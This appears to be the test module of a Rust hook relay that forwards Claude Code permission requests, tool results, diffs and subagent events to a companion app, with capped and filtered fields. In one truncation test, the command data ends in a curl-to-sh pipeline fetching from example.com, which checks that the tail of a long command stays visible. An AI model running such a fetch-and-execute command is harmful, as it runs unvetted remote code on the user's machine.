            r#"{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Denied from Nook"}}}"#
        );
        // The old "always" is no answer any more.
        assert!(decision_json("always").is_none());
        // A skipped question is a denial that says what it is.
        let skipped = decision_json("skip").unwrap();
        assert!(skipped.contains(r#""behavior":"deny""#) && skipped.contains("skipped this question"));
    }

    #[test]
    fn anything_unrecognised_prints_nothing() {
        assert!(decision_json("").is_none());
        assert!(decision_json("maybe").is_none());
        // The shape the app used to send must not be mistaken for a decision.
        assert!(decision_json(r#"{"permissionDecision":"allow"}"#).is_none());
    }

    #[test]
    fn an_answer_goes_back_with_the_question_it_answers() {
        let input = serde_json::json!({ "questions": [{ "question": "Which engine?" }] });
        let out = reply_json(r#"answer {"Which engine?":"Postgres"}"#, Some(&input)).unwrap();
        let v: serde_json::Value = serde_json::from_str(&out).unwrap();
        let decision = &v["hookSpecificOutput"]["decision"];
        assert_eq!(v["hookSpecificOutput"]["hookEventName"], "PermissionRequest");
        assert_eq!(decision["behavior"], "allow");
        assert_eq!(decision["updatedInput"]["questions"][0]["question"], "Which engine?");
        assert_eq!(decision["updatedInput"]["answers"]["Which engine?"], "Postgres");
        // Without the question there is nothing to answer; a plain word still works.
        assert!(reply_json(r#"answer {"a":"b"}"#, None).is_none());
        assert!(reply_json("answer nonsense", Some(&input)).is_none());
        assert_eq!(reply_json("deny", None), decision_json("deny"));
    }

    #[test]
    fn an_edit_becomes_a_diff_with_its_line_numbers() {
        let response = serde_json::json!({
            "filePath": "a.rs",
            "structuredPatch": [{
                "oldStart": 2, "oldLines": 3, "newStart": 2, "newLines": 4,
                "lines": [" mod claude;", "-mod files;", "+mod files;", "+mod github;", " mod hooks;"],
            }],
        });
        let change = change_of(&response).unwrap();
        assert_eq!(
            change["patch"],
            "@@ -2,3 +2,4 @@\n mod claude;\n-mod files;\n+mod files;\n+mod github;\n mod hooks;\n"
        );
        assert_eq!(change["additions"], 2);
        assert_eq!(change["deletions"], 1);
        assert_eq!(change["created"], false);
        assert_eq!(change["truncated"], false);
    }

    #[test]
    fn a_new_file_is_all_additions_and_a_long_one_is_cut() {
        let created = serde_json::json!({ "type": "create", "content": "one\ntwo\n", "structuredPatch": [] });
        let change = change_of(&created).unwrap();
        assert_eq!(change["patch"], "@@ -0,0 +1,2 @@\n+one\n+two\n");
        assert_eq!(change["created"], true);

        let long = serde_json::json!({ "type": "create", "content": "line of text\n".repeat(5000), "structuredPatch": [] });
        let change = change_of(&long).unwrap();
        assert!(change["patch"].as_str().unwrap().len() <= MAX_PATCH + 32);
        assert_eq!(change["truncated"], true);
        // Counted whole, even where the diff itself was cut.
        assert_eq!(change["additions"], 5000);

        // A response with nothing to show — a read, a failed edit — is no change.
        assert!(change_of(&serde_json::json!({ "structuredPatch": [] })).is_none());
        assert!(change_of(&serde_json::json!("done")).is_none());
    }

    #[test]
    fn a_proposed_edit_is_shown_where_it_lands() {
        let before = "one\ntwo\nthree\nfour\nfive\nsix\nseven\neight\n";
        let edit = serde_json::json!({ "old_string": "five", "new_string": "5\nfive and a half" });
        let after = apply(before, &edit).unwrap();
        let diff = diff_of(before, &after, false).unwrap();
        assert_eq!(
            diff["patch"],
            "@@ -2,7 +2,8 @@\n two\n three\n four\n-five\n+5\n+five and a half\n six\n seven\n eight\n"
        );
        assert_eq!(diff["additions"], 2);
        assert_eq!(diff["deletions"], 1);
        // Text that is not in the file cannot be replaced: no proposal, the card stays plain.
        assert!(apply(before, &serde_json::json!({ "old_string": "nine", "new_string": "9" })).is_none());
        // Nothing changed is nothing to show.
        assert!(diff_of(before, before, false).is_none());
    }

    #[test]
    fn a_proposed_edit_is_read_from_the_file_and_never_written() {
        let path = std::env::temp_dir().join(format!("nook-hook-test-{}.txt", std::process::id()));
        std::fs::write(&path, "alpha\r\nbeta\r\ngamma\r\n").unwrap();
        let file = path.to_string_lossy().to_string();

        let edit = serde_json::json!({ "file_path": file, "old_string": "beta", "new_string": "BETA" });
        let proposal = proposal_of("Edit", &edit).unwrap();
        assert_eq!(proposal["patch"], "@@ -1,3 +1,3 @@\n alpha\n-beta\n+BETA\n gamma\n");
        assert_eq!(proposal["created"], false);

        let write = serde_json::json!({ "file_path": file, "content": "alpha\nbeta\ngamma\ndelta\n" });
        assert_eq!(proposal_of("Write", &write).unwrap()["patch"], "@@ -1,3 +1,4 @@\n alpha\n beta\n gamma\n+delta\n");

        assert_eq!(std::fs::read_to_string(&path).unwrap(), "alpha\r\nbeta\r\ngamma\r\n");
        std::fs::remove_file(&path).unwrap();

        // The file is gone now: writing it is creating it.
        let created = proposal_of("Write", &write).unwrap();
        assert_eq!(created["patch"], "@@ -0,0 +1,4 @@\n+alpha\n+beta\n+gamma\n+delta\n");
        assert_eq!(created["created"], true);
        assert!(proposal_of("Edit", &edit).is_none());
    }

    #[test]
    fn the_title_is_the_last_one_the_transcript_names() {
        assert_eq!(
            title_in(r#"{"type":"custom-title","customTitle":" Panneau GitHub ","sessionId":"x"}"#).as_deref(),
            Some("Panneau GitHub")
        );
        assert_eq!(title_in(r#"{"type":"summary","summary":"Fix the hook","leafUuid":"y"}"#).as_deref(), Some("Fix the hook"));
        // A message that merely talks about titles is not one.
        assert!(title_in(r#"{"type":"user","message":{"content":"the custom-title\" line"}}"#).is_none());
        assert!(title_in("not json -title\"").is_none());

        let path = std::env::temp_dir().join(format!("nook-hook-title-{}.jsonl", std::process::id()));
        std::fs::write(
            &path,
            "{\"type\":\"custom-title\",\"customTitle\":\"First\"}\n{\"type\":\"user\"}\n{\"type\":\"custom-title\",\"customTitle\":\"Second\"}\n{\"type\":\"assistant\"}\n",
        )
        .unwrap();
        let tail = tail_of(&path.to_string_lossy()).unwrap();
        assert_eq!(title_of(&tail).as_deref(), Some("Second"));
        std::fs::remove_file(&path).unwrap();
        assert!(tail_of(&path.to_string_lossy()).is_none());
    }

    #[test]
    fn what_claude_said_last_is_its_last_message_with_words() {
        let tail = [
            r#"{"type":"assistant","message":{"content":[{"type":"text","text":"First answer."}]}}"#,
            r#"{"type":"user","message":{"content":"and the \"assistant\" said?"}}"#,
            r#"{"type":"assistant","message":{"content":[{"type":"thinking","thinking":"hm"},{"type":"text","text":"Done."},{"type":"text","text":"Two files changed."}]}}"#,
            r#"{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{}}]}}"#,
            r#"{"type":"custom-title","customTitle":"A title"}"#,
        ]
        .join("\n");
        assert_eq!(last_message_of(&tail).as_deref(), Some("Done.\n\nTwo files changed."));
        assert!(last_message_of(r#"{"type":"user","message":{"content":"hello"}}"#).is_none());
        assert_eq!(clip("héllo", 3), "hél…");
        assert_eq!(clip("hey", 3), "hey");
    }

    #[test]
    fn a_command_shows_the_end_of_what_it_printed_without_its_colours() {
        let printed = (1..=60).map(|i| format!("line {i}")).collect::<Vec<_>>().join("\n");
        let response = serde_json::json!({ "stdout": format!("{printed}\n\u{1b}[32mPASS\u{1b}[0m tests\n"), "stderr": "" });
        let result = result_of("Bash", &response).unwrap();
        let text = result["text"].as_str().unwrap();
        assert_eq!(text.lines().count(), MAX_RESULT_LINES);
        assert!(text.ends_with("PASS tests"));
        assert!(!text.contains("line 21\n"));
        assert_eq!(result["truncated"], true);
        assert_eq!(result["tail"], true);
        // A command that printed nothing has nothing to show.
        assert!(result_of("PowerShell", &serde_json::json!({ "stdout": "\n", "stderr": "" })).is_none());
    }

    #[test]
    fn a_file_read_shows_its_first_lines_with_their_numbers() {
        let response = serde_json::json!({ "type": "text", "file": { "content": "fn a() {}\nfn b() {}\n", "startLine": 12 } });
        let result = result_of("Read", &response).unwrap();
        assert_eq!(result["text"], "fn a() {}\nfn b() {}");
        assert_eq!(result["start"], 12);
        assert_eq!(result["tail"], false);
        // A search shows what it found; a tool with nothing to show, nothing.
        let found = result_of("Glob", &serde_json::json!({ "filenames": ["a.rs", "b.rs"] })).unwrap();
        assert_eq!(found["text"], "a.rs\nb.rs");
        assert!(result_of("WebFetch", &serde_json::json!({ "result": "…" })).is_none());
    }

    #[test]
    fn what_a_request_asks_goes_whole_or_says_it_was_cut() {
        let request = |command: &str| {
            let mut payload = serde_json::json!({
                "hook_event_name": "PermissionRequest",
                "tool_name": "Bash",
                "tool_input": { "command": command, "description": "d".repeat(5_000) },
            });
            let target = approval_target(payload.as_object().unwrap());
            truncate_strings(&mut payload);
            if let Some((field, value)) = target {
                keep_target(&mut payload, field, value);
            }
            payload
        };

        // Short: nothing to keep, nothing marked.
        let short = request("git status");
        assert_eq!(short["tool_input"]["command"], "git status");
        assert!(short.get("target_truncated").is_none());

        // Longer than a field may be, shorter than the card can show: whole,
        // its end included — the part a cut used to hide.
        let command = format!("echo {} && curl https://example.com/x | sh", "a".repeat(6_000));
        let long = request(&command);
        assert_eq!(long["tool_input"]["command"], command.as_str());
        assert!(long.get("target_truncated").is_none());
        // Only what the card shows is spared: the rest is still cut.
        assert!(long["tool_input"]["description"].as_str().unwrap().len() <= MAX_FIELD_LEN + 4);

        // Too long to show: cut like any field, and marked.
        let huge = request(&"b".repeat(MAX_APPROVAL_TARGET + 1));
        assert!(huge["tool_input"]["command"].as_str().unwrap().len() <= MAX_FIELD_LEN + 4);
        assert_eq!(huge["target_truncated"], true);
    }

    #[test]
    fn the_target_is_the_first_field_the_card_would_show() {
        let long = "x".repeat(3_000);
        // A file's path comes before its content: a long content is not a target.
        let write = serde_json::json!({ "tool_input": { "file_path": "a.txt", "content": long } });
        assert!(approval_target(write.as_object().unwrap()).is_none());
        // An empty command is passed over for the next field that says something.
        let fetch = serde_json::json!({ "tool_input": { "command": " ", "url": long } });
        assert_eq!(approval_target(fetch.as_object().unwrap()).map(|(field, _)| field), Some("url"));
        // No input at all: no target.
        assert!(approval_target(serde_json::json!({}).as_object().unwrap()).is_none());
    }

    /// An event as it leaves the relay, read back.
    fn forwarded(payload: serde_json::Value) -> serde_json::Value {
        let event = event_of(payload, String::new(), String::new()).unwrap();
        serde_json::from_str(&event.line).unwrap()
    }

    #[test]
    fn an_agent_call_keeps_the_id_of_the_agent_it_launched() {
        for tool in ["Agent", "Task"] {
            let out = forwarded(serde_json::json!({
                "hook_event_name": "PostToolUse", "session_id": "s", "cwd": "C:\\work", "tool_name": tool,
                "tool_input": { "description": "Count files", "prompt": "List the files", "subagent_type": "general-purpose" },
                "tool_response": {
                    "isAsync": true, "status": "async_launched", "agentId": "af3d8c03f03bd405d",
                    "description": "Count files", "prompt": "p".repeat(50_000), "outputFile": "C:\\Users\\me\\out.txt",
                },
            }));
            assert_eq!(out["launched_agent"], "af3d8c03f03bd405d");
            assert_eq!(out["launched_async"], true);
            assert_eq!(out["tool_input"]["description"], "Count files");
            // Only the id leaves the response: the rest of it goes, as for any tool.
            assert!(out.get("tool_response").is_none());
        }
        // Another tool's response is not looked at, and a call that has not come back has no id yet.
        let read = forwarded(serde_json::json!({
            "hook_event_name": "PostToolUse", "tool_name": "Read", "tool_response": { "agentId": "abc" },
        }));
        assert!(read.get("launched_agent").is_none());
        let before = forwarded(serde_json::json!({
            "hook_event_name": "PreToolUse", "tool_name": "Agent", "tool_response": { "agentId": "abc" },
        }));
        assert!(before.get("launched_agent").is_none());
        // An id that is not one — empty, not text, far too long — is no id.
        assert!(launched_agent_of(&serde_json::json!({ "agentId": " " })).is_none());
        assert!(launched_agent_of(&serde_json::json!({ "agentId": 12 })).is_none());
        assert!(launched_agent_of(&serde_json::json!({ "agentId": "a".repeat(MAX_AGENT_ID + 1) })).is_none());
        assert!(launched_agent_of(&serde_json::json!("launched")).is_none());
    }

    #[test]
    fn an_agent_call_that_waited_for_its_subagent_says_it_is_back() {
        // In the foreground the call comes back once the subagent has stopped, with what it did.
        let out = forwarded(serde_json::json!({
            "hook_event_name": "PostToolUse", "session_id": "s", "cwd": "C:\\work", "tool_name": "Agent",
            "tool_input": { "description": "Map the routes", "prompt": "Find them", "subagent_type": "Explore" },
            "tool_response": {
                "agentId": "a7c258cef279401a1", "agentType": "Explore", "content": [{ "type": "text", "text": "Done." }],
                "totalDurationMs": 41_000, "totalToolUseCount": 7,
            },
        }));
        assert_eq!(out["launched_agent"], "a7c258cef279401a1");
        assert_eq!(out["launched_async"], false);
        assert!(out.get("tool_response").is_none());
        // No subagent named: nothing is said of how it ran either.
        let none = forwarded(serde_json::json!({
            "hook_event_name": "PostToolUse", "tool_name": "Agent", "tool_response": { "isAsync": true },
        }));
        assert!(none.get("launched_async").is_none());
    }

    #[test]
    fn an_agent_call_says_which_model_its_subagent_runs_on() {
        let call = |response: serde_json::Value| {
            forwarded(serde_json::json!({ "hook_event_name": "PostToolUse", "tool_name": "Agent", "tool_response": response }))
        };
        let out = call(serde_json::json!({ "agentId": "af3d8c03f03bd405d", "resolvedModel": "claude-opus-5-5", "prompt": "p" }));
        assert_eq!(out["launched_model"], "claude-opus-5-5");
        assert!(out.get("tool_response").is_none());
        // No model named, or no subagent to say it of: nothing.
        assert!(call(serde_json::json!({ "agentId": "af3d8c03f03bd405d" })).get("launched_model").is_none());
        assert!(call(serde_json::json!({ "resolvedModel": "claude-opus-5-5" })).get("launched_model").is_none());
        // Another tool's response is not looked at.
        let read = forwarded(serde_json::json!({
            "hook_event_name": "PostToolUse", "tool_name": "Read", "tool_response": { "agentId": "a", "resolvedModel": "claude-opus-5-5" },
        }));
        assert!(read.get("launched_model").is_none());
        // A model's id as a provider writes one is still one; free text is not.
        let model = |name: serde_json::Value| launched_model_of(&serde_json::json!({ "resolvedModel": name }));
        assert_eq!(model(serde_json::json!(" us.anthropic.claude-sonnet-5-v1:0 ")).as_deref(), Some("us.anthropic.claude-sonnet-5-v1:0"));
        assert_eq!(model(serde_json::json!("claude-opus-5-5[1m]")).as_deref(), Some("claude-opus-5-5[1m]"));
        for not_one in [serde_json::json!(""), serde_json::json!(12), serde_json::json!("the best\none"), serde_json::json!("a model"), serde_json::json!("m".repeat(MAX_MODEL_ID + 1))] {
            assert!(model(not_one).is_none());
        }
    }

    #[test]
    fn the_model_a_session_names_goes_through_as_it_came() {
        // SessionStart names the session's model: a plain id, left as it is.
        let start = forwarded(serde_json::json!({ "hook_event_name": "SessionStart", "session_id": "s", "cwd": "C:\\work", "source": "startup", "model": "claude-opus-5-5" }));
        assert_eq!(start["model"], "claude-opus-5-5");
        // Were it ever an object, it would go through whole too, each string capped like any other.
        let object = forwarded(serde_json::json!({ "hook_event_name": "SessionStart", "model": { "id": "claude-opus-5-5", "display_name": "x".repeat(MAX_FIELD_LEN + 50) } }));
        assert_eq!(object["model"]["id"], "claude-opus-5-5");
        assert_eq!(object["model"]["display_name"].as_str().unwrap().chars().count(), MAX_FIELD_LEN + 1);
    }

    #[test]
    fn a_subagent_stops_on_what_it_said_last_cut_short() {
        let out = forwarded(serde_json::json!({
            "hook_event_name": "SubagentStop", "session_id": "s", "cwd": "C:\\work",
            "agent_id": "a1d6303f7f7626095", "agent_type": "general-purpose",
            "agent_transcript_path": "C:\\Users\\me\\.claude\\projects\\p\\s\\subagents\\agent-a1d6303f7f7626095.jsonl",
            "last_assistant_message": format!("  The write did not succeed. {}", "x".repeat(MAX_SUBAGENT_MESSAGE)),
        }));
        let said = out["last_message"].as_str().unwrap();
        assert!(said.starts_with("The write did not succeed."));
        assert_eq!(said.chars().count(), MAX_SUBAGENT_MESSAGE + 1);
        assert!(said.ends_with('…'));
        // What it was lifted from does not go twice, and no path to a transcript goes at all.
        assert!(out.get("last_assistant_message").is_none());
        assert!(out.get("agent_transcript_path").is_none());
        assert!(out.get("transcript_path").is_none());

        // A subagent that said nothing has no last message: the session's transcript is not read for it.
        let silent = forwarded(serde_json::json!({ "hook_event_name": "SubagentStop", "agent_id": "a", "last_assistant_message": " " }));
        assert!(silent.get("last_message").is_none());
        // An event that is no turn's end lifts nothing.
        let tool = forwarded(serde_json::json!({ "hook_event_name": "PreToolUse", "last_assistant_message": "hello" }));
        assert!(tool.get("last_message").is_none());
        assert!(tool.get("last_assistant_message").is_none());
    }

    #[test]
    fn who_is_at_work_goes_through_untouched() {
        let tasks = serde_json::json!([
            { "id": "af3d8c03f03bd405d", "type": "subagent", "status": "running", "description": "Count files", "agent_type": "general-purpose" },
            { "id": "a1d6303f7f7626095", "type": "subagent", "status": "running", "description": "Write a note", "agent_type": "general-purpose" },
        ]);
        let stop = forwarded(serde_json::json!({
            "hook_event_name": "Stop", "session_id": "s", "cwd": "C:\\work",
            "last_assistant_message": "Two agents are at work.", "background_tasks": tasks,
        }));
        assert_eq!(stop["background_tasks"], tasks);
        assert_eq!(stop["last_message"], "Two agents are at work.");
        // A turn that ends with nothing in the background says so with an empty list, not with none.
        let ended = forwarded(serde_json::json!({ "hook_event_name": "Stop", "cwd": "C:\\work", "background_tasks": [] }));
        assert_eq!(ended["background_tasks"], serde_json::json!([]));

        // A tool event from inside a subagent, a permission request included, says whose it is.
        for event in ["PreToolUse", "PostToolUse", "PermissionRequest", "SubagentStart"] {
            let out = forwarded(serde_json::json!({
                "hook_event_name": event, "session_id": "s", "cwd": "C:\\work",
                "agent_id": "a1d6303f7f7626095", "agent_type": "general-purpose",
                "tool_name": "Bash", "tool_input": { "command": "ls" },
            }));
            assert_eq!(out["agent_id"], "a1d6303f7f7626095");
            assert_eq!(out["agent_type"], "general-purpose");
        }
    }

    #[test]
    fn nothing_of_the_environment_goes_but_what_names_the_terminal() {
        let sent = ["hook_event_name", "session_id", "cwd", "agent_id"];
        let added: Vec<&str> = ENV_CONTEXT.iter().map(|(key, _)| *key).collect();
        let out = forwarded(serde_json::json!({ "hook_event_name": "SubagentStart", "session_id": "s", "cwd": "C:\\work", "agent_id": "a" }));
        for key in out.as_object().unwrap().keys() {
            assert!(sent.contains(&key.as_str()) || added.contains(&key.as_str()), "{key} must not be forwarded");
        }
    }

    #[test]
    fn where_a_session_runs_is_said_when_it_starts_and_when_it_is_spoken_to() {
        for event in ["PreToolUse", "PostToolUse", "PermissionRequest", "Stop", "SubagentStart", "Notification"] {
            // Not on a tool's event — and never what somebody else put there.
            let out = forwarded(serde_json::json!({ "hook_event_name": event, "cwd": "C:\\work", "ancestors": [{ "pid": 4, "name": "Code.exe" }] }));
            assert!(out.get("ancestors").is_none(), "{event} must not carry the ancestors");
        }
        for event in HOST_EVENTS {
            let out = forwarded(serde_json::json!({ "hook_event_name": event, "cwd": "C:\\work", "ancestors": [{ "pid": 4, "name": "Code.exe" }] }));
            // Linux reports none. On Windows the test runs under cargo, in
            // whatever started it: only the shape can be told.
            let Some(named) = out.get("ancestors") else { continue };
            assert_ne!(named[0]["pid"], 4, "what came on the wire is not what goes out");
            for ancestor in named.as_array().unwrap() {
                let mut fields: Vec<&String> = ancestor.as_object().unwrap().keys().collect();
                fields.sort();
                assert_eq!(fields, ["name", "pid"], "a pid and a name, nothing else");
                assert!(ancestor["pid"].as_u64().unwrap() > 0);
                assert!(HOST_NAMES.contains(&ancestor["name"].as_str().unwrap().to_lowercase().as_str()));
            }
        }
    }

    #[test]
    fn only_the_ancestors_worth_naming_are_named_and_none_past_the_desktop() {
        let p = |pid: u32, name: &str| Proc { pid, name: name.to_string() };
        let chain = [
            p(10, "claude.exe"), p(11, "node.exe"), p(12, "pwsh.exe"), p(13, "WindowsTerminal.exe"),
            p(14, "explorer.exe"), p(15, "userinit.exe"), p(16, "cmd.exe"),
        ];
        assert_eq!(
            reported(&chain).unwrap(),
            serde_json::json!([
                { "pid": 10, "name": "claude.exe" }, { "pid": 12, "name": "pwsh.exe" },
                { "pid": 13, "name": "WindowsTerminal.exe" }, { "pid": 14, "name": "explorer.exe" },
            ])
        );
        // Nobody known above, or nobody at all: no field, rather than an empty one.
        assert!(reported(&[p(1, "bash.exe"), p(2, "mintty.exe")]).is_none());
        assert!(reported(&[]).is_none());
        // A pid that is none names nobody, and a chain is never longer than its cap.
        assert!(reported(&[p(0, "cmd.exe")]).is_none());
        let long: Vec<Proc> = (1..=40).map(|pid| p(pid, "cmd.exe")).collect();
        assert_eq!(reported(&long).unwrap().as_array().unwrap().len(), MAX_ANCESTORS);
    }

    #[test]
    fn the_diagnostic_prints_what_an_event_would_carry() {
        let out: serde_json::Value = serde_json::from_str(&where_json()).unwrap();
        for (key, _) in ENV_CONTEXT {
            assert!(out["env"][*key].is_string(), "{key} is part of the context");
        }
        assert!(out["ancestors"].is_array() && out["chain"].is_array());
        assert!(out["ancestors"].as_array().unwrap().len() <= out["chain"].as_array().unwrap().len());
    }

    #[test]
    fn long_strings_are_cut_on_a_char_boundary() {
        let mut v = serde_json::json!({ "tool_input": { "content": "é".repeat(4000) } });
        truncate_strings(&mut v);
        let s = v["tool_input"]["content"].as_str().unwrap();
        assert!(s.len() <= MAX_FIELD_LEN + 4);
        assert!(s.ends_with('…'));
    }
}
